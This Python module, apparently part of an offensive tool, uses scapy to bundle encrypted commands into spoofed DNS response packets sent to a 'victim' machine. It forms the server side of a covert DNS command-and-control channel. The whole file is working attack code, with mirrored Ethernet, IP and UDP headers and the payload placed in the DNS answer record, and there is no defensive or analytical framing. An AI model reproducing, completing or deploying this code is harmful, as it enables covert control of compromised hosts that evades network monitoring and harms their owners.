"""Bundles given commands into packets to be sent to the victim. 
"""
from scapy.all import *
from utils.consts import PKT_CONF

class Bundler():

    def __init__(self, victim_mac, victim_packet, config):
        self.victim_mac = victim_mac
        self.victim_packet = victim_packet
        self.fake_hostname = self.victim_packet.getlayer(DNSQR).qname
        self.victim_id = victim_packet.getlayer(Ether).src
        self.config = config

    def build_command_pkt(self, encrypted_comand):
        p = self._build_ether() / self._build_ip() / self._build_udp() / self._build_dns(encrypted_comand)
        return p

    def _build_packet(self):
        return self._build_ether()

    def _build_ether(self):
        # Not sure if we need src
        ether_layer = self.victim_packet.getlayer(Ether)
        return Ether(dst=ether_layer.src, src=ether_layer.dst)

    def _build_ip(self):
        ip_layer = self.victim_packet.getlayer(IP)
        return IP(dst=ip_layer.src, src=ip_layer.dst, ttl=PKT_CONF['IP']['ttl'], version=PKT_CONF['IP']['version'])
    
    def _build_udp(self):
        udp_layer = self.victim_packet.getlayer(UDP)
        return UDP(sport=udp_layer.dport, dport=udp_layer.sport)

    def _build_dns(self, payload):
        dns_layer = self.victim_packet.getlayer(DNS)
        dnsqr_layer = self.victim_packet.getlayer(DNSQR)
        return DNS(
            qr=1, rd=1, ra=1, ancount=1, nscount=0, arcount=0,
            ns=None, ar=None,
            qd = dnsqr_layer,
            an = DNSRR(
                rrname=dnsqr_layer.qname, # Update with spoof address
                type=PKT_CONF['DNS']['type'],
                rclass=PKT_CONF['DNS']['rclass'],
                ttl=PKT_CONF['DNS']['ttl'],
                rdata=payload # Update with payload
            )
        )